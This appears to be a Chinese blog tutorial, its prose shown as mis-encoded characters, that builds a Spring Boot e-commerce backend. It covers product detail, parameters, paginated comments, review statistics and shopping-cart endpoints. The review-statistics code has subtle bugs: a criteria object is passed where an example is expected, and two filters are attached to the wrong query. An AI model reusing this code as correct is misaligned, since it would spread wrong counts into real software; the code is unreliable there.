class="hljs-meta">@GetMapping(&quot;/category-recommends&quot;)</span><span class="hljs-meta">@ApiOperation(value = &quot;æ ¹æ®å•†å“åˆ†ç±»é”€é‡å‰å…­æ¨èå•†å“&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getRecommendByCategoryList</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-keyword">return</span> ResultVO.success(productService.getRecommendByCategory());&#125;</code></pre><p>æ¥å£æµ‹è¯•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712235308867.png" alt="image-20220712235308867"></p><p>å‰ç«¯å®ç°æ•ˆæœ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712235328090.png" alt="image-20220712235328090"></p></li></ul><h3 id="1-8-å•†å“è¯¦æƒ…"><a href="#1-8-å•†å“è¯¦æƒ…" class="headerlink" title="1.8 å•†å“è¯¦æƒ…"></a>1.8 å•†å“è¯¦æƒ…</h3><blockquote><p>ç‚¹å‡»é¦–é¡µæ¨èçš„å•†å“ã€è½®æ’­å›¾å•†å“å¹¿å‘Šã€å•†å“åˆ—è¡¨é¡µé¢ç‚¹å‡»å•†å“ï¼Œå°±ä¼šè¿›å…¥åˆ°å•†å“çš„è¯¦æƒ…é¡µé¢</p><p>ç”¨æˆ·ç‚¹å‡»æ—¶ï¼Œæºå¸¦å•†å“çš„idè¿›è¡Œåç«¯è¯·æ±‚ï¼Œåç«¯æ¥æ”¶åˆ°å•†å“idåï¼Œè¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œè¿”å›è¯¦ç»†ä¿¡æ¯</p><p>åŒ…æ‹¬ä»¥ä¸‹å†…å®¹</p><p>1.å•†å“çš„åŸºæœ¬ä¿¡æ¯</p><p>2.å•†å“çš„å¥—é¤ä¿¡æ¯</p><p>3.å•†å“çš„å›¾ç‰‡ä¿¡æ¯</p><p>4.å•†å“çš„è¯„ä»·ä¿¡æ¯</p><p>5.å•†å“çš„å‚æ•°ä¿¡æ¯</p></blockquote><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713104403656.png" alt="image-20220713104403656"></p><h4 id="å•†å“è¯¦æƒ…æ¥å£"><a href="#å•†å“è¯¦æƒ…æ¥å£" class="headerlink" title="å•†å“è¯¦æƒ…æ¥å£"></a>å•†å“è¯¦æƒ…æ¥å£</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713110111555.png" alt="image-20220713110111555"></p><p>æ¥å£æ‰€éœ€ä¿¡æ¯å¦‚ä¸‹ï¼Œåªéœ€è¦ä¸‰ä¸ªå•è¡¨æŸ¥è¯¢å³å¯å®Œæˆï¼Œå› æ­¤daoå±‚å¯ä»¥ç›´æ¥ä½¿ç”¨tkMapperæä¾›çš„æ¥å£</p><ul><li><p>service</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductBasicInfo</span><span class="hljs-params">(String productId)</span> </span>&#123;    <span class="hljs-comment">//1.å•†å“åŸºæœ¬ä¿¡æ¯</span>    Example example = <span class="hljs-keyword">new</span> Example(Product.class);    Example.Criteria criteria = example.createCriteria();    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);    criteria.andEqualTo(<span class="hljs-string">&quot;productStatus&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">//çŠ¶æ€ä¸º1è¡¨ç¤ºä¸Šæ¶å•†å“</span>    List&lt;Product&gt; products = productMapper.selectByExample(example);    <span class="hljs-keyword">if</span>(products.size() &gt; <span class="hljs-number">0</span>)&#123;        Example exampleImg = <span class="hljs-keyword">new</span> Example(ProductImg.class);        Example.Criteria imgCriteria = exampleImg.createCriteria();        imgCriteria.andEqualTo(<span class="hljs-string">&quot;itemId&quot;</span>,productId);        List&lt;ProductImg&gt; productImgs = productImgMapper.selectByExample(exampleImg);        Example exampleSku = <span class="hljs-keyword">new</span> Example(ProductSku.class);        Example.Criteria skuCriteria = exampleSku.createCriteria();        skuCriteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);        List&lt;ProductSku&gt; productSkus = productSkuMapper.selectByExample(exampleSku);        HashMap&lt;String, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();        hashMap.put(<span class="hljs-string">&quot;product&quot;</span>, products.get(<span class="hljs-number">0</span>));        hashMap.put(<span class="hljs-string">&quot;productImgs&quot;</span>, productImgs);        hashMap.put(<span class="hljs-string">&quot;productSkus&quot;</span>, productSkus);        <span class="hljs-keyword">return</span> ResultVO.success(hashMap);    &#125;    <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;æŸ¥è¯¢çš„å•†å“ä¸å­˜åœ¨&quot;</span>);&#125;</code></pre><ul><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><span class="hljs-meta">@CrossOrigin</span><span class="hljs-meta">@RequestMapping(&quot;/product&quot;)</span><span class="hljs-meta">@Api(value = &quot;æä¾›å•†å“ä¿¡æ¯ç›¸å…³çš„æ¥å£&quot;,tags = &quot;å•†å“ç®¡ç†&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductController</span> </span>&#123;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> ProductService productService;    <span class="hljs-meta">@Autowired</span>    <span class="hljs-keyword">private</span> ProductCommontsService productCommontsService;    <span class="hljs-meta">@ApiOperation(&quot;å•†å“åŸºæœ¬ä¿¡æ¯æŸ¥è¯¢æ¥å£&quot;)</span>    <span class="hljs-meta">@GetMapping(&quot;/detail-info/&#123;pid&#125;&quot;)</span>    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductBasicInfo</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span></span>&#123;        <span class="hljs-keyword">return</span> productService.getProductBasicInfo(pid);    &#125;&#125;</code></pre></li></ul></li></ul><p>  æ¥å£æµ‹è¯•</p><p>  <img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713110939926.png" alt="image-20220713110939926"></p><h4 id="å•†å“å‚æ•°æ¥å£"><a href="#å•†å“å‚æ•°æ¥å£" class="headerlink" title="å•†å“å‚æ•°æ¥å£"></a>å•†å“å‚æ•°æ¥å£</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713111914400.png" alt="image-20220713111914400"></p><p>æ¥å£æ‰€éœ€æ•°æ®å¯çŸ¥ï¼Œä¹Ÿä¸ºå•è¡¨æŸ¥è¯¢ï¼Œå› æ­¤daoå±‚å¯ä»¥ç›´æ¥ä½¿ç”¨tkMapperæä¾›çš„æ¥å£</p><ul><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductParamsById</span><span class="hljs-params">(String productId)</span> </span>&#123;    <span class="hljs-comment">//1.å•†å“åŸºæœ¬ä¿¡æ¯</span>    Example example = <span class="hljs-keyword">new</span> Example(Product.class);    Example.Criteria criteria = example.createCriteria();    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);    criteria.andEqualTo(<span class="hljs-string">&quot;productStatus&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">//çŠ¶æ€ä¸º1è¡¨ç¤ºä¸Šæ¶å•†å“</span>    List&lt;Product&gt; products = productMapper.selectByExample(example);    <span class="hljs-keyword">if</span>(products.size() &gt; <span class="hljs-number">0</span>)&#123;        Example exampleParams = <span class="hljs-keyword">new</span> Example(ProductParams.class);        Example.Criteria criteria1 = exampleParams.createCriteria();        criteria1.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>, productId);        List&lt;ProductParams&gt; params = productParamsMapper.selectByExample(exampleParams);        <span class="hljs-keyword">if</span>(params.size() &gt; <span class="hljs-number">0</span>)&#123;            <span class="hljs-keyword">return</span> ResultVO.success(params.get(<span class="hljs-number">0</span>));        &#125;<span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;æ­¤äº§å“ä¸ºä¸‰æ— äº§å“ï¼&quot;</span>);        &#125;    &#125;<span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;æŸ¥è¯¢çš„å•†å“ä¸å­˜åœ¨&quot;</span>);    &#125;&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;å•†å“å‚æ•°ä¿¡æ¯æŸ¥è¯¢æ¥å£&quot;)</span><span class="hljs-meta">@GetMapping(&quot;/detail-params/&#123;pid&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductParams</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span></span>&#123;    <span class="hljs-keyword">return</span> productService.getProductParamsById(pid);&#125;</code></pre><p>æµ‹è¯•ç»“æœ</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713112142962.png" alt="image-20220713112142962"></p></li></ul><h4 id="å•†å“è¯„ä»·æ¥å£"><a href="#å•†å“è¯„ä»·æ¥å£" class="headerlink" title="å•†å“è¯„ä»·æ¥å£"></a>å•†å“è¯„ä»·æ¥å£</h4><p>è¯„ä»·æ¥å£éœ€è¦å®Œæˆä¸¤ä¸ªåŠŸèƒ½ï¼šè¯„ä»·åˆ—è¡¨åˆ†é¡µå±•ç¤ºå’Œè¯„ä»·åˆ†æ</p><ul><li><p>è¯„ä»·åˆ—è¡¨åˆ†é¡µå±•ç¤º</p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713113518231.png" alt="image-20220713113518231" style="zoom:67%;"><p>â€‹    </p><p>æ¥å£æ‰€éœ€å‚æ•°å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹å‡ºéœ€è¦å…³è”ç”¨æˆ·æ•°æ®ï¼Œå› æ­¤ä¸ºå¤šè¡¨å…³è”æŸ¥è¯¢</p><ul><li><p>sql</p><pre><code class="hljs mysql">select u.username,  u.nickname, u.user_img,  c.comm_id, c.product_id, c.product_name,  c.order_item_id, c.user_id, c.is_anonymous,  c.comm_type, c.comm_level, c.comm_content,  c.comm_imgs, c.sepc_name, c.reply_status,  c.reply_content, c.reply_time, c.is_showfrom product_comments cINNER JOIN users uON u.user_id &#x3D; c.user_idWHERE c.product_id &#x3D; 3limit 1,5</code></pre></li><li><p>dao</p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ProductCommentsVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductCommentsVO&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderItemId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_anonymous&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isAnonymous&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commType&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_level&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commLevel&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commContent&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_imgs&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commImgs&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sepc_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sepcName&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyStatus&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyContent&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyTime&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_show&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isShow&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;nickname&quot;</span> /&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userImg&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectCommontsByProductId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductCommentsVOMap&quot;</span>&gt;</span>  select u.username,  u.nickname, u.user_img,    c.comm_id, c.product_id, c.product_name,    c.order_item_id, c.user_id, c.is_anonymous,    c.comm_type, c.comm_level, c.comm_content,    c.comm_imgs, c.sepc_name, c.reply_status,    c.reply_content, c.reply_time, c.is_show  from product_comments c  INNER JOIN users u  ON u.user_id = c.user_id  WHERE c.product_id =#&#123;productId&#125;  limit #&#123;start&#125;,#&#123;limit&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre></li><li><p>serevice</p><p>æ·»åŠ å®ä½“ç±»ProductCommentsVO</p><pre><code class="hljs java"><span class="hljs-meta">@Data</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductCommentsVO</span> </span>&#123;    <span class="hljs-keyword">private</span> String commId;    <span class="hljs-keyword">private</span> String productId;    <span class="hljs-keyword">private</span> String productName;    <span class="hljs-keyword">private</span> String orderItemId;    <span class="hljs-keyword">private</span> Integer isAnonymous;    <span class="hljs-keyword">private</span> Integer commType;    <span class="hljs-keyword">private</span> Integer commLevel;    <span class="hljs-keyword">private</span> String commContent;    <span class="hljs-keyword">private</span> String commImgs;    <span class="hljs-keyword">private</span> Date sepcName;    <span class="hljs-keyword">private</span> Integer replyStatus;    <span class="hljs-keyword">private</span> String replyContent;    <span class="hljs-keyword">private</span> Date replyTime;    <span class="hljs-keyword">private</span> Integer isShow;    <span class="hljs-comment">//å°è£…è¯„è®ºå¯¹åº”çš„ç”¨æˆ·æ•°æ®</span>    <span class="hljs-keyword">private</span> String userId;    <span class="hljs-keyword">private</span> String username;    <span class="hljs-keyword">private</span> String nickname;    <span class="hljs-keyword">private</span> String userImg;&#125;</code></pre><p>æ·»åŠ åˆ†é¡µå®ä½“ç±»</p><pre><code class="hljs java"><span class="hljs-meta">@Data</span><span class="hljs-meta">@NoArgsConstructor</span><span class="hljs-meta">@AllArgsConstructor</span><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PageHelper</span>&lt;<span class="hljs-title">T</span>&gt; </span>&#123;    <span class="hljs-comment">//æ€»è®°å½•æ•°</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> count;    <span class="hljs-comment">//æ€»é¡µæ•°</span>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> pageCount;    <span class="hljs-comment">//åˆ†é¡µæ•°æ®</span>    <span class="hljs-keyword">private</span> List&lt;T&gt; list;&#125;</code></pre><p>Serviceçš„ä»£ç </p><pre><code class="hljs java"><span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listCommontsByProductId</span><span class="hljs-params">(String productId,<span class="hljs-keyword">int</span> pageNum,<span class="hljs-keyword">int</span> limit)</span> </span>&#123;    <span class="hljs-comment">//List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId);</span>    <span class="hljs-comment">//1.æ ¹æ®å•†å“idæŸ¥è¯¢æ€»è®°å½•æ•°</span>    Example example = <span class="hljs-keyword">new</span> Example(ProductComments.class);    Example.Criteria criteria = example.createCriteria();    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);    <span class="hljs-keyword">int</span> count = productCommentsMapper.selectCountByExample(example);        <span class="hljs-comment">//2.è®¡ç®—æ€»é¡µæ•°ï¼ˆå¿…é¡»ç¡®å®šæ¯é¡µæ˜¾ç¤ºå¤šå°‘æ¡  pageSize = limitï¼‰</span>    <span class="hljs-keyword">int</span> pageCount = count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;        <span class="hljs-comment">//3.æŸ¥è¯¢å½“å‰é¡µçš„æ•°æ®ï¼ˆå› ä¸ºè¯„è®ºä¸­éœ€è¦ç”¨æˆ·ä¿¡æ¯ï¼Œå› æ­¤éœ€è¦è¿è¡¨æŸ¥è¯¢---è‡ªå®šä¹‰ï¼‰</span>    <span class="hljs-keyword">int</span> start = (pageNum-<span class="hljs-number">1</span>)*limit;    List&lt;ProductCommentsVO&gt; list = productCommentsMapper.selectCommontsByProductId(productId, start, limit);        <span class="hljs-keyword">return</span> ResultVO.success(list);&#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;å•†å“è¯„ä»·åˆ†é¡µæŸ¥è¯¢æ¥å£&quot;)</span><span class="hljs-meta">@GetMapping(&quot;/detail-commonts/&#123;pid&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductCommonts</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid,</span></span><span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@RequestParam(&quot;pageNum&quot;)</span> <span class="hljs-keyword">int</span> pageNum,</span></span><span class="hljs-function"><span class="hljs-params">                                   <span class="hljs-meta">@RequestParam(&quot;limit&quot;)</span> <span class="hljs-keyword">int</span> limit)</span></span>&#123;    <span class="hljs-keyword">return</span> productCommontsService.listCommontsByProductId(pid, pageNum, limit);&#125;</code></pre><p>æ¥å£æµ‹è¯•</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713150611632.png" alt="image-20220713150611632"></p></li></ul></li><li><p>è¯„ä»·åˆ†æ</p><p>å¯¹è¯¥å•†å“çš„è¯„ä»·è¿›è¡Œåˆ†ç±»ï¼Œåˆ†ä¸ºå¥½è¯„ä¸­è¯„å’Œå·®è¯„</p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713112838049.png" alt="image-20220713112838049"></p><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713113028811.png" alt="image-20220713113028811"></p><p>å“åº”æ•°æ®å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹å‡ºæ˜¯å•è¡¨æŸ¥è¯¢</p><ul><li><p>service</p><pre><code class="hljs java"><span class="hljs-meta">@Override</span> <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getCommentsCountByProductId</span><span class="hljs-params">(String productId)</span> </span>&#123;    <span class="hljs-comment">// æŸ¥è¯¢å•†å“æ€»æ•°</span>     Example example = <span class="hljs-keyword">new</span> Example(ProductComments.class);     Example.Criteria criteria = example.createCriteria();     criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);     <span class="hljs-keyword">int</span> total = productCommentsMapper.selectCountByExample(criteria);         <span class="hljs-comment">// æŸ¥è¯¢å¥½è¯„æ•°</span>     Example example1 = <span class="hljs-keyword">new</span> Example(ProductComments.class);     Example.Criteria criteria1 = example1.createCriteria();     criteria1.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);     criteria1.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, <span class="hljs-number">1</span>);     <span class="hljs-keyword">int</span> goodTotal = productCommentsMapper.selectCountByExample(example1);         <span class="hljs-comment">// æŸ¥è¯¢ä¸­è¯„æ•°</span>     Example example2 = <span class="hljs-keyword">new</span> Example(ProductComments.class);     Example.Criteria criteria2 = example1.createCriteria();     criteria2.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);     criteria2.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, <span class="hljs-number">0</span>);     <span class="hljs-keyword">int</span> midTotal = productCommentsMapper.selectCountByExample(example2);         <span class="hljs-comment">// æŸ¥è¯¢å·®è¯„æ•°</span>     Example example3 = <span class="hljs-keyword">new</span> Example(ProductComments.class);     Example.Criteria criteria3 = example1.createCriteria();     criteria3.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);     criteria3.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, -<span class="hljs-number">1</span>);     <span class="hljs-keyword">int</span> badTotal = productCommentsMapper.selectCountByExample(example3);         <span class="hljs-comment">// å¥½è¯„ç‡</span>     <span class="hljs-keyword">double</span> percent = (Double.parseDouble(goodTotal+<span class="hljs-string">&quot;&quot;</span>)/Double.parseDouble(total + <span class="hljs-string">&quot;&quot;</span>)) * <span class="hljs-number">100</span>;     String percentValue = (percent+<span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">0</span>,(percent+<span class="hljs-string">&quot;&quot;</span>).lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">3</span>);         HashMap&lt;String, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();     hashMap.put(<span class="hljs-string">&quot;total&quot;</span>, total);     hashMap.put(<span class="hljs-string">&quot;goodTotal&quot;</span>, goodTotal);     hashMap.put(<span class="hljs-string">&quot;badTotal&quot;</span>, badTotal);     hashMap.put(<span class="hljs-string">&quot;midTotal&quot;</span>, midTotal);     hashMap.put(<span class="hljs-string">&quot;percent&quot;</span>, percentValue);          <span class="hljs-keyword">return</span> ResultVO.success(hashMap);     &#125;</code></pre></li><li><p>controller</p><pre><code class="hljs java">    <span class="hljs-meta">@ApiOperation(&quot;å•†å“æ€»ä½“è¯„ä»·ä¿¡æ¯æŸ¥è¯¢æ¥å£&quot;)</span><span class="hljs-meta">@GetMapping(&quot;/detail-commontscount/&#123;pid&#125;&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getProductCommontscount</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span></span>&#123;    <span class="hljs-keyword">return</span> productCommontsService.getCommentsCountByProductId(pid);&#125;</code></pre></li></ul></li></ul><h3 id="1-9-è´­ç‰©è½¦ä¸šåŠ¡"><a href="#1-9-è´­ç‰©è½¦ä¸šåŠ¡" class="headerlink" title="1.9 è´­ç‰©è½¦ä¸šåŠ¡"></a>1.9 è´­ç‰©è½¦ä¸šåŠ¡</h3><h4 id="æ·»åŠ è´­ç‰©è½¦"><a href="#æ·»åŠ è´­ç‰©è½¦" class="headerlink" title="æ·»åŠ è´­ç‰©è½¦"></a>æ·»åŠ è´­ç‰©è½¦</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713151431751.png" alt="image-20220713151431751"></p><ul><li><p>Service</p><pre><code class="hljs java"><span class="hljs-keyword">private</span> SimpleDateFormat sdf = <span class="hljs-keyword">new</span> SimpleDateFormat(<span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);    <span class="hljs-meta">@Override</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addShoppingCart</span><span class="hljs-params">(ShoppingCart cart)</span> </span>&#123;    cart.setCartTime(sdf.format(<span class="hljs-keyword">new</span> Date()));    <span class="hljs-keyword">int</span> i = shoppingCartMapper.insert(cart);    <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK,<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-keyword">null</span>);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO,<span class="hljs-string">&quot;fail&quot;</span>,<span class="hljs-keyword">null</span>);    &#125;</code></pre></li><li><p>Controller</p><pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span><span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addShoppingCart</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ShoppingCart cart)</span></span>&#123;    ResultVO resultVO = shoppingCartService.addShoppingCart(cart);    <span class="hljs-keyword">return</span> resultVO;&#125;</code></pre></li></ul><h4 id="è·å–è´­ç‰©è½¦åˆ—è¡¨"><a href="#è·å–è´­ç‰©è½¦åˆ—è¡¨" class="headerlink" title="è·å–è´­ç‰©è½¦åˆ—è¡¨"></a>è·å–è´­ç‰©è½¦åˆ—è¡¨</h4><ul><li>sql</li></ul>  <pre><code class="hljs mysql">select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,c.product_price, c.sku_props,p.product_name, i.url,s.original_price,s.sell_price,s.sku_namefrom shopping_cart c inner JOIN product pINNER JOIN product_sku sINNER JOIN product_img iON c.product_id &#x3D; 